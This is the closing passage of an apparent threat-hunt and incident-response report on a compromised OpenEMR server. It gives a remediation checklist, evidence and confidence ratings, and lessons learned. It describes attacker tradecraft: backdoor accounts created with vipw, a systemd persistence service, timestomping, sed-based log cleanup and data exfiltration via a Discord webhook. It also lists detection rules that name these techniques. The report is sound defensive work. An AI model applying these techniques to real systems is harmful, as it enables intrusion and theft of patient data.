- [ ] Isolate `rocky83` from the network
- [ ] Disable / delete all attacker-created accounts: `system`, `it.admin`, `r0ckyyy335`, `svc.monitor`, `svc.integration`, `svc.backup`, `helpdesk.tier2`, `it.patch`, `it.infra`
- [ ] Reset MariaDB `DB_PASS` credential (exposed via `/etc/openemr/audit_export.env`)
- [ ] Reset `root` password (changed by attacker on 2026-02-05)
- [ ] Block C2 IP `20.62.27.80` at firewall
- [ ] Block origin IP `37.19.221.234` at firewall
- [ ] Report Discord webhook URL to Discord for takedown
- [ ] Preserve MDE telemetry and forensic image before remediation
- [ ] Notify legal and compliance — breach notification assessment required (archive sourced from OpenEMR doc_exports, contents unconfirmed)

### 🟠 Short Term (4–24 hours)

- [ ] Remove persistence mechanisms:
  - [ ] Delete `/etc/systemd/system/integration-monitor.service`
  - [ ] Run `systemctl daemon-reload` after removal
- [ ] Remove hijacked scripts and restore from backup:
  - [ ] `/opt/backup/scripts/backup_manifest.sh`
  - [ ] `/opt/monitoring/scripts/health_snapshot.sh`
  - [ ] `/opt/integrations/scripts/integration_heartbeat.sh`
- [ ] Remove fake utilities from `/usr/local/bin/`:
  - [ ] `check_disk`, `net_monitor`, `proc_count`, `mem_check`
- [ ] Purge staging directory `/var/lib/integrations/`
- [ ] Audit cron jobs for malicious entries
- [ ] Rotate all OpenEMR database credentials
- [ ] Review and restore log files from SIEM backup (`/var/log/secure`, `/var/log/messages` were tampered)
- [ ] Audit `/etc/group` and `/etc/shadow` — both modified by attacker

### 🟡 Medium Term (1–7 days)

- [ ] Rebuild `rocky83` from clean image — extent of compromise warrants full rebuild
- [ ] Conduct full audit of OpenEMR database for unauthorized access or data modification
- [ ] Implement egress filtering blocking Discord webhook endpoints and non-approved SaaS upload destinations
- [ ] Deploy detection rules identified in this report
- [ ] Review Docker container security — credentials should not be stored in plaintext `.env` files accessible from the host
- [ ] Implement secrets management (e.g. HashiCorp Vault) for database credentials
- [ ] Audit all SSH authorized keys on rocky83 — attacker had extended dwell time

### 🔵 Long Term (1–4 weeks)

- [ ] Implement SSH key-based authentication only — disable password auth
- [ ] Deploy privileged access workstation (PAW) for admin access to healthcare systems
- [ ] Implement SIEM-based alerting for all detection rules in this report
- [ ] Conduct purple team exercise against OpenEMR/Docker environment
- [ ] Brief CISO and compliance team on breach scope for HIPAA notification assessment
- [ ] Update incident response playbooks for Linux/Docker/container intrusions

---

## 🧾 Final Assessment

### Risk Conclusion

The attacker demonstrated medium-to-high sophistication — consistently choosing living-off-the-land binaries (`vipw`, `tee`, `cat`, `sed`, `touch`) over custom tooling, and pivoting exfiltration methods when blocked (sftp → scp → Discord). The choice of a Discord webhook for final exfiltration shows awareness of network egress controls and the ability to adapt in real time. The `system` account name was a deliberate and effective camouflage choice.

The attacker had approximately 8 days of dwell time on `rocky83`, during which they established multiple persistence mechanisms (systemd service, 9 backdoor accounts, hijacked operational scripts), harvested database credentials, and successfully exfiltrated OpenEMR document exports. Despite selective log cleanup, MDE process telemetry retained a complete evidence chain — including the cleanup commands themselves — enabling full attack reconstruction.

Breach notification under HIPAA should be assessed by the compliance team given the confirmed exfiltration of a compressed archive sourced from `/var/log/openemr/doc_exports/`. The exact contents of that archive were not directly inspected during this hunt; given the source directory and the confirmed harvesting of MariaDB credentials (`DB_PASS`), the likelihood of patient-related data exposure is high and warrants immediate review.

### Evidence Quality Rating

| Evidence Type | Quality | Notes |
|--------------|---------|-------|
| Process execution logs | `🟢 High` | `MDE DeviceProcessEvents — complete chain including cleanup commands` |
| Network telemetry | `🟢 High` | `DeviceNetworkEvents — confirmed failed and successful exfil connections` |
| Authentication logs | `🟠 Medium` | `Attacker deleted useradd/passwd entries from /var/log/secure; MDE logon events intact` |
| File activity | `🟢 High` | `DeviceFileEvents — service file versions, /etc/passwd writes, staging scripts` |
| EDR alerts | `🟢 High` | `MDE SecurityAlert — timestomp alert confirmed T1070.006` |

### Confidence Assessment

| Finding | Confidence |
|---------|-----------|
| Initial access vector (SSH brute force from 37.19.221.234) | `🟢 High — confirmed by DeviceLogonEvents` |
| Attacker account (it.admin) | `🟢 High — confirmed by logon and process telemetry` |
| C2 infrastructure (20.62.27.80) | `🟢 High — confirmed by network events and process command lines` |
| Data exfiltrated (doc_exports archive) | `🟢 High — confirmed by curl command line and network event` |
| Backdoor accounts (9 accounts) | `🟢 High — confirmed by useradd process events and logon summarization` |
| Full scope of database access | `🟡 Medium — DB_PASS confirmed stolen; actual DB queries not confirmed in telemetry` |
| Attribution beyond handle "streetrack" | `🔴 Low — only attacker handle available; no further identity information` |

---

## 📎 Analyst Notes

- All evidence reproducible via KQL queries documented in each flag section
- MDE process telemetry proved more reliable than log file evidence — attacker's `sed -i` cleanup was itself captured in DeviceProcessEvents
- The `vipw` technique for account creation is a notable detection gap — most hunt playbooks focus on `useradd`/`adduser` only
- Discord webhook exfiltration bypassed network controls entirely — SaaS-based exfil detection should be prioritized
- The `system` account name demonstrates threat actor awareness of Linux environment assumptions — defenders should enumerate all local accounts against expected baselines regularly
- Forged `/var/log/messages` timestamp of `2026-02-06 12:00:00` would have been 5 days before actual attacker activity — a meaningful misdirection if log files were the primary evidence source

### 📝 Lessons Learned

- **What worked well:** Anchoring on file write events for `/etc/passwd` and service files surfaced stealthy techniques that process-level hunting missed. KQL `FileName == "sed"` vs `ProcessCommandLine has "sed"` distinction was critical for accurate count.
- **What to do differently:** Start with `DeviceLogonEvents` summarized by AccountName earlier in the investigation to surface unauthorized accounts faster rather than chasing `useradd` process events.
- **New detection rules revealed:** `vipw` execution alert, systemd service creation by non-approved accounts, curl to `discord.com/api/webhooks`, `touch` against `/var/log/` paths.
- **Log sources that were insufficient:** `/var/log/secure` and `/var/log/messages` were tampered — MDE telemetry was the authoritative source. Emphasizes the importance of real-time SIEM ingestion independent of host-side log files.

---

*Report generated by: T2 // Michael Kirby | 2026-06-13 | Rocky Clinic IR — Hunt 07*
*Classification: `TLP:RED — CONFIDENTIAL` — Do not distribute without authorization*
